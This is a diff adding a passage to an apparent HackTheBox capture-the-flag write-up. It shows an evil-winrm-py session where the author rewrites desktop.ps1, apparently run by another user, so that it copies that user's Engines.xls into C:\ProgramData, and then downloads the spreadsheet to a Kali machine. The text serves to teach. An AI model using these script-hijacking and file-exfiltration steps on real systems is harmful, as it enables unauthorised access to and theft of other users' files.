@@ -359,4 +359,40 @@ There is a spreadsheet there
 evil-winrm-py PS C:\ProgramData> echo "cp C:\Users\maria\Desktop\Engines.xls C:\ProgramData" > desktop.ps1
 ```
 
-Then
+Then ill just change the contents of the script to move the file
+
+```python
+evil-winrm-py PS C:\ProgramData> dir
+
+
+    Directory: C:\ProgramData
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+d---s-       10/21/2021   3:13 AM                Microsoft                                                              
+d-----       10/21/2021  12:05 AM                regid.1991-06.com.microsoft                                            
+d-----        9/15/2018  12:19 AM                SoftwareDistribution                                                   
+d-----        4/10/2020   5:48 AM                ssh                                                                    
+d-----        4/10/2020  10:49 AM                USOPrivate                                                             
+d-----        4/10/2020  10:49 AM                USOShared                                                              
+d-----        8/25/2021   2:57 AM                VMware                                                                 
+-a----        9/25/2026  11:34 AM            110 desktop.ps1                                                            
+-a----        9/25/2026  11:34 AM            830 desktop.txt                                                            
+-a----       10/26/2021   8:13 AM           6144 Engines.xls                                                            
+-a----        9/25/2026  11:10 AM         770279 powerview.ps1                                                          
+
+
+evil-winrm-py PS C:\ProgramData>
+```
+
+I now have the spreadsheet
+
+```python
+evil-winrm-py PS C:\ProgramData> download Engines.xls /home/kali/htb/object/
+Downloading C:\ProgramData\Engines.xls: 64.0kB [00:00, 992MB/s]                                              
+[+] File downloaded successfully and saved as: /home/kali/htb/object/Engines.xls
+evil-winrm-py PS C:\ProgramData>
+```
+
+Ill then download this to my m
